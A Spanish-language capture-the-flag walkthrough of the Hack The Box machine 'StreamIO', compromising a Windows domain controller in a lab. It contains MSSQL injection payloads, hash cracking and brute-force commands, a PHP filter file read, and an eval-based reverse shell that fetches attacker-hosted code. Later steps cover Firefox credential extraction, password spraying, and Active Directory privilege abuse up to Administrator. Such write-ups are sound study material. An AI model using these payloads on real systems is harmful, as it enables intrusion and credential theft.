---
tags:
title: StreamIO - Medium (HTB)
permalink: /StreamIO-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimietno 

```bash
nmap -sCV -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49707 10.129.68.234 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-23 16:50 EDT
Stats: 0:03:16 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.96% done; ETC: 16:54 (0:00:00 remaining)
Nmap scan report for 10.129.68.234
Host is up (0.53s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-24 03:51:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-10-24T03:54:22+00:00; +7h00m01s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-title: Not Found
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-24T03:52:20
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 235.00 seconds
```

# Service enumeration 

### HTPPS / Port 443

Debido a que el escaneo de `nmap`, nos descrubrio un nuevo subdominio de la maquina podemos agregarlo al `/etc/hosts` 

```bash
sudo echo -n 'watch.streamio.htb' | sudo tee -a /etc/hosts
```

![image-center](/assets/images/Untitled 94.jpg)

Vemos que es una pagina web de peliculas

### Gobuster enumeration

```bash
gobuster dir -u https://watch.streamio.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,ini,asp,aspx,js,py,txt,md -t 200 -k
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://watch.streamio.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              js,py,txt,md,php,ini,asp,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 400) [Size: 3420]
/index.php            (Status: 200) [Size: 2829]
Progress: 844 / 11464479 (0.01%)[ERROR] error on word search.php: timeout occurred during the request
/static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]
/Search.php           (Status: 200) [Size: 253887]
/Index.php            (Status: 200) [Size: 2829]
```


## Shell as yoshihide

Vemos un archivo de busqueda en `search.php`.

![image-center](/assets/images/Untitled 95.jpg)
Vemos que nos sale varias peliculas, por lo que podriamos intentar varios tipos de inyecciones como `SQLi`, `XSS`, etc, Empecemos con inyecciones `SQL`
Asi que voy a intentar por ejemplo intentar detectando el numero de columnas por ejemplo con las siguente inyeccion

```sql
`abcd' union select 1;-- -`
```

Asi hasta dar con el numero correcto, que en mi caso la base tiene una cantidad de `6` columnas.

![image-center](/assets/images/website.webp)

Y es asi como vemos que el numero `2` y `3` se ven reflejados en la pagina, listemos ante que base de datos estamos.

```bash
abcd' union select 1,@@version,3,4,5,6;-- -
```

![image-center](/assets/images/website 2.webp)

Como vemos que el base es `mssql` tenemos que amoldar nuestras querys a la de una base de datos de `Microsoft SQL Server`
Listemos bases de datos.

```sql
`abcd' union select 1, name, 3,4,5,6 from master..sysdatabasese;-- -`
```

![image-center](/assets/images/website 1.webp)

Como vemos las bases de datos `streamio` y `backup` listamos sus columnas. Spoiler!! No tenemos acceso a listar los datos de `streamio_backup`.

![image-center](/assets/images/website 3.webp)

Obtengo tanto el nombre como el ID de la tabla para poder usar el ID para obtener las columnas.

Si intento obtener las tablas `streamio_backup`, no devuelve nada. Probablemente se trate de un problema de permisos (lo confirmaré más adelante).

Obtendré las columnas de ambas tablas con:

```sql
abcd' union select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,901578250);-- -
```

![image-center](/assets/images/website 4.webp)

Ahora que puedo ver que existen las tabals `users` y `password`, puedo listar el contenido de ambas.

```sql
abcd' union select 1,concat(username,password),id,4,5,6 from streamio..users-- -
```

![image-center](/assets/images/Untitled 96.jpg)

Ahora que veo que son varios usuarios lo que vemos con hashes `md5`, por lo q voy a meterlos en una archivos y tratar de romperlos con hashcat.

```bash

hashcat --user users -m 0 /usr/share/wordlists.rockyou.txt

3577c47eb1e12c8ba021611e1280753c:highschoolmusical        
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i               
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..         
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$           
ef8f3d30a856cf166fb8215aca93e9ff:%$clara                  
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW                   
6dcd87740abb64edfa36d170f0d5450d:$3xybitch                
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##         
Approaching final keyspace - workload adjusted.           

b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123              
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$               
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!               
                                                          

```

Y ahora para ver de una manera mas comoda a que usuario pertenece cada una.

```bash
hashcat user_pass.txt -m 0  /usr/share/wordlists/rockyou.txt --user --show
Mixing --show with --username or --dynamic-x can cause exponential delay in output.

Hashfile 'user_pass.txt' on line 1 (admin:665a50ac9eaa781e4f7f04199db97a11:): Token length exception
Hashfile 'user_pass.txt' on line 2 (Alexen...c2b3d8270321140e5153f6637d3ee53:): Token length exception

* Token length exception: 2/30 hashes
  This error happens if the wrong hash type is specified, if the hashes are
  malformed, or if input is otherwise not as expected (for example, if the
  --username or --dynamic-x option is used but no username or dynamic-tag is present)

Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
```

Los meto en un archivo con un formato `user:pass`, para luego con `hydra` hacer fuerza bruta contra el panel de login en la pagina principal (`streamio.htb`).

```bash
hydra -C userpass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-23 19:53:43
[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries, ~1 try per task
[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:F=failed
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-23 19:54:17
```

Solo una credencial es valida para la pagina principal, nos conectamos.

![image-center](/assets/images/Untitled 97.jpg)

Vemos que ahora como el usuario `yoshihide`, podemos ver el panel de `admin` y cada uno de los botones nos lleva a `http://<ip>/admin/?user`, o distintos parametros como `staff`, `movie`, `message`. Por lo que podriamos intentar un `Path traversal` intentando usar cada uno de los parametro para ver si la pagina es vulnerable a este.

![image-center](/assets/images/Untitled 98.jpg)

Como veo que no puedo listar archivos del sistema, fuzzeo por parametros.

```bash
wfuzz -c -t 200 -u https://streamio.htb/admin/?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=vq380jm93ael3u7mna4kdruj4l' --hh=1678
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz''s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://streamio.htb/admin/?FUZZ=test
Total requests: 6453

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================

000001575:   200        49 L     137 W      1712 Ch     "debug"                                                                                                                     
000003530:   200        10790    25878 W    320235 Ch   "movie"                                                                                                                     
                        L                                                                                                                                                           
000005450:   200        398 L    916 W      12484 Ch    "staff"                                                                                                                     
000006133:   200        62 L     160 W      2073 Ch     "user"
```

Como veo que me descubre el `parametro` nuevo que es `debug`, ahora podemos intentar con ese parametro realizar el mismo ataque.

![image-center](/assets/images/Untitled 99.jpg)

Ahora que si puedo leer archivos del sistema, podria jugar con filtros `php`, como `read`, `input`, etc, para poder ver el codigo de la misma pagina. Pero para eso necesito saber archivos del sistemas ademas del `index.php`.

```bash
gobuster dir -u https://streamio.htb/admin -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,ini,asp,aspx,js,py,txt,md -t 200 -k --cookies=vq380jm93ael3u7mna4kdruj4l
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb/admin
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] Cookies:                 vq380jm93ael3u7mna4kdruj4l
[+] User Agent:              gobuster/3.8
[+] Extensions:              asp,aspx,js,py,txt,md,php,ini
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/ (Status: 400) [Size: 3420]
/index.php            (Status: 403) [Size: 18]
/images               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/images/]
/Images               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/Images/]
/css                  (Status: 301) [Size: 154] [--> https://streamio.htb/admin/css/]
/Index.php            (Status: 403) [Size: 18]
/js                   (Status: 301) [Size: 153] [--> https://streamio.htb/admin/js/]
/master.php           (Status: 200) [Size: 58]
/fonts                (Status: 301) [Size: 156] [--> https://streamio.htb/admin/fonts/]
Progress: 576097 / 11464470 (5.03%)^C
```

Ahora como vemos el archivo `master.php`, leamos el contenido del mismo, con la siguiente inyeccion.

```bash
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```

Ese payload nos devuelve el base64 el codigo fuente de ese archivo como podemos ver en la siguiente imagen.

![image-center](/assets/images/Untitled 100.jpg)

Ahora desde mi consola lo decodifopara ver el codigo en texto claro.

```bash
echo <base64> | base64 -d 
```

```php
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['movie']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST" action="?movie=">
                                <input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
        die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
        <div class="form-control" style="height: 3rem;">
                <h4 style="float:left;"><?php echo $row['username']; ?></h4>
                <div style="float:right;padding-right: 25px;">
                        <form method="POST">
                                <input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
                                <input type="submit" class="btn btn-sm btn-primary" value="Delete">
                        </form>
                </div>
        </div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

De todo este codigo la parte interesante es la siguiente.

```php
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

Donde veo que si por `POST` mediante el parametro `include` le enviamos x cosa, el codigo lo interpreta con `php` con ayuda de `eval()`, por lo que podria desde mi consola crear un archivo `php` con una reverse shell haciendo que la maquina lo interprete y asi me envie la shell

```bash
system("powershell -e <base64-chain>")
```

![image-center](/assets/images/Untitled 101.jpg)

Y como veo desde mi shell con un servidor en python anteriormente seteado, la maquina descarga mi archivo desde mi `ip` y lo interpreta haciendo que asi yo consiga mi shell como vemos ahora,

```bash
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.247.52] 50453
whoami
streamio\yoshihide
PS C:\inetpub\streamio.htb\admin>
```

Una vez dentro de la maquina vemos que en la ruta `C:\inetpub\watch.streamio.htb`, estan los archivos `php` de la maquina con credenciales para `db_user` y `db_admin`.

```powershell
PS C:\inetpub\watch.streamio.htb> type search.php
<?php
$search = strtolower($_POST['q']);

// sqlmap choker
$shitwords = ["/WAITFOR/i", "/vkBQ/i", "/CHARINDEX/i", "/ALL/i", "/SQUARE/i", "/ORDER/i", "/IF/i","/DELAY/i", "/NULL/i", "/UNICODE/i","/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "ifnull/i", "/ or /i"];
foreach ($shitwords as $shitword) {
        if (preg_match( $shitword, $search )) {
                header("Location: https://watch.streamio.htb/blocked.php");
                die("blocked");
        }
}


# Query section
$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
$handle = sqlsrv_connect('(local)',$connection);
if (!isset($_POST['q']))
<SNIP..>
```

Para ver dentro de los archivos dentro de la carpeta buscamos por el mismo patron.

```powershell
PS C:\inetpub\streamio.htb> dir -recurse *.php | select-string -pattern "database"

admin\index.php:9:$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
login.php:46:$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
register.php:81:    $connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
```

Ahora que tengo credenciales necesito conectarme a la base de datos para ver si cualquiera de estos usuarios tienen privilegios como para poder ver la base de datos de `streamio_backup`.

```powershell
where.exe sqlcmd
C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
```

Ahora que se la ruta de `SQLCMD` ya puedo conectarme a la base de datos.

```powershell
PS C:\> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
table_name
--------------------------------------------------------------------------------------------------------------------------------
movies
users

(2 rows affected)
```

Listo el contenido de la tabla `users`. Y ahora veo usuarios distintos al volcado original de la inyeccion del principio

```powershell
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
id          username                                           password                                          
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  

(8 rows affected)
```

Los meti en un archivo y con `hashcat` los rompo.

```bash
hashcat user-passwords-backup /usr/share/wordlists/rockyou.txt -m0 --user --show
nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```

Y con `kerbrute` veo si las credenciales son para algun usuario.

```bash
kerbrute passwordspray --dc 10.129.247.55 -d streamio.htb users get_dem_girls2@yahoo.com

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 10/24/25 - Ronnie Flathers @ropnop

2025/10/24 01:10:54 >  Using KDC(s):
2025/10/24 01:10:54 >   10.129.247.55:88

2025/10/24 01:10:57 >  [+] VALID LOGIN WITH ERROR:       nikk37@streamio.htb:get_dem_girls2@yahoo.com    (Clock skew is too great)
2025/10/24 01:10:58 >  Done! Tested 31 logins (1 successes) in 3.162 seconds
```

Como veo que me sale un error de sincronizacion, puedo sincronizarlo con `ntpdate`.

```bash
ntpdate -b 10.129.247.55
2025-10-24 08:13:46.230392 (-0400) +0.000359 +/- 0.173447 10.129.247.55 s1 no-leap
CLOCK: time stepped by 0.000359
```

Y ahora me conecto a `WinRM`.

```bash
evil-winrm -i streamio.htb -u nikk37 -p get_dem_girls2@yahoo.com
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'''' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nikk37\Documents> dir
```

## Shell as JDgodd

Enumerando no encontre nada asi que tuve que usar winPEAS.exe, y el mismo me descubrio archivos de base `key4.db`que posiblemente, tenga credenciales guardadas de navegadores, donde dentro de la carpeta esta el `key`, `certs` y ademas el `logins.json`

```powershell
https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
Run SharpWeb (https://github.com/djhohnstein/SharpWeb)
```

Ahora con `firefox_decrypt`, podemos extraer las credenciales guardas, para eso metemos los 3 archivos dentro de una carpeta para despues poder extraerlas

```bash
python3 firefox_decrypt.py -f human firefox
2025-10-24 08:42:20,136 - WARNING - profile.ini not found in firefox
2025-10-24 08:42:20,136 - WARNING - Continuing and assuming 'firefox' is a profile location

Website:   https://slack.streamio.htb
Username: 'admin'
Password: 'JDg0dd1s@d0p3cr3@t0r'

Website:   https://slack.streamio.htb
Username: 'nikk37'
Password: 'n1kk1sd0p3t00:)'

Website:   https://slack.streamio.htb
Username: 'yoshihide'
Password: 'paddpadd@12'

Website:   https://slack.streamio.htb
Username: 'JDgodd'
Password: 'password@12'
```

Con exito extrajo credenciales de algunos usuarios, y ahora que las tengo puedo tratar de hacer un password spray para ver cual pertenece a `JDgodd`, con `kerbrute`.

```bash
nxc smb streamIO.HTB -u 'JDgodd' -p pass -k
SMB         streamIO.HTB    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False) 
SMB         streamIO.HTB    445    DC               [-] streamIO.htb\JDgodd:highschoolmusical KDC_ERR_PREAUTH_FAILED 
SMB         streamIO.HTB    445    DC               [-] streamIO.htb\JDgodd:physics69i KDC_ERR_PREAUTH_FAILED 
SMB         streamIO.HTB    445    DC               [-] streamIO.htb\JDgodd:66boysandgirls.. KDC_ERR_PREAUTH_FAILED 
SMB         streamIO.HTB    445    DC               [-] streamIO.htb\JDgodd:$monique$1991$ KDC_ERR_PREAUTH_FAILED 
SMB         streamIO.HTB    445    DC               [-] streamIO.htb\JDgodd:%$clara KDC_ERR_PREAUTH_FAILED 
SMB         streamIO.HTB    445    DC               [-] streamIO.htb\JDgodd:$hadoW KDC_ERR_PREAUTH_FAILED 
SMB         streamIO.HTB    445    DC               [-] streamIO.htb\JDgodd:$3xybitch KDC_ERR_PREAUTH_FAILED 
SMB         streamIO.HTB    445    DC               [-] streamIO.htb\JDgodd:##123a8j8w5123## KDC_ERR_PREAUTH_FAILED 
SMB         streamIO.HTB    445    DC               [-] streamIO.htb\JDgodd:get_dem_girls2@yahoo.com KDC_ERR_PREAUTH_FAILED 
SMB         streamIO.HTB    445    DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:) KDC_ERR_PREAUTH_FAILED 
SMB         streamIO.HTB    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
```

Ahora que tengo credenciales yo en mi caso se que el usuario no es parte del Grupo `Remote management users`, por lo que solo nos queda enumerar con `bloodhound`, debido a que ya se que estamos nate un `DC`.

```bash
bloodhound-python -d dc.streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.129.247.55 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
ERROR: Could not find a domain controller. Consider specifying a domain and/or DNS server.
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/streamio]
└─# impacket-getTGT streamIO.htb/JDgodd:JDg0dd1s@d0p3cr3@t0r -dc-ip 10.129.247.55
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in JDgodd.ccache
```

Como me dio errores solicite un `TGT` y asi ahora puedo recolectar los datos del domiinio.

```bash
bloodhound-python -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -ns 10.129.247.55 -c All
```

![image-center](/assets/images/Untitled 102.jpg)

Como veo que el usuario `JDgodd` tiene privilegios `WriteOwner` sobre el grupo `Core Staff` podemos aprovechar de `PowerView` para agregarnos a ese grupo.

```powershell
Import-Module .\PowerView.ps1
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
Set-DomainObjectOwner -Credential $Cred -Identity "Core Staff" -OwnerIdentity JDgodd
Add-DomainGroupMember -Identity 'Core Staff' -Members 'JDgodd' -Credential $Cred
Get-DomainGroupMember -Identity 'Core Staff'
```

Chequeo que ahora el usuario pertenezca al grupo.

```bash
net user jdgodd
User name                    JDgodd
Full Name
Comment
Users comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 2:56:42 AM
Password expires             Never
Password changeable          2/23/2022 2:56:42 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/24/2025 6:51:52 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *CORE STAFF
The command completed successfully.
```

Y como este grupo tiene permisos `ReadLdapPassword` sobre el dominio podemos tratar de ver la contraseña del administrador del dominio, usando tambien la misma tool.

```powershell
Get-ADComputer -Credential $Cred -Properties ms-Mcs-AdmPwd -Filter *


DistinguishedName : CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
DNSHostName       : DC.streamIO.htb
Enabled           : True
ms-Mcs-AdmPwd     : n3-if/fQJ-{quo
Name              : DC
ObjectClass       : computer
ObjectGUID        : 8c0f9a80-aaab-4a78-9e0d-7a4158d8b9ee
SamAccountName    : DC$
SID               : S-1-5-21-1470860369-1569627196-4264678630-1000
UserPrincipalName :
```

Como tuve exito al tratar de leer la pass ahora solicito un `TGT` para el usuario `Administrator` para luego conectarme a la maquina para ver la `flag`
.

```bash
impacket-getTGT 'streamio.htb/administrator:n3-if/fQJ-{quo' -dc-ip 10.129.247.55  
Impacket v0.13.0.dev0+20251016.112753.23a36c62 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache
```

```bash
evil-winrm -i streamio.htb -u Administrator -p 'n3-if/fQJ-{quo'
                                        
Evil-WinRM shell v3.7

*Evil-WinRM* PS C:\Users\Administrator\Documents> type c:\users\martin\desktop\root.txt
01f6c2d56bba753e6a67718b33c90557
```

`~Happy Hacking.`


